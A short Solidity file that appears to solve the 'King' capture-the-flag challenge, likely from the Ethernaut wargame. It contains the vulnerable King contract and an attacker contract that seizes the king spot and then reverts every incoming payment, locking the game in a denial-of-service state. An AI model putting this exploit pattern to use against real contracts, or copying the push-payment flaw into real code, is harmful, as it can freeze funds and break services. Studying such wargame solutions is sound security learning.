// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() public payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        king.transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract NewKing {
    King public king = King(0x0754821630Fdf6E48b90B76473E0873dD9651950);

    function claimKing() public {
        address(king).call{value: 1000000000000000000}("");
    }

    fallback() external payable {
        revert("Can't claim back the king spot lol");
    }

    receive() external payable {
        revert("Can't claim back the king spot lol");
    }
}
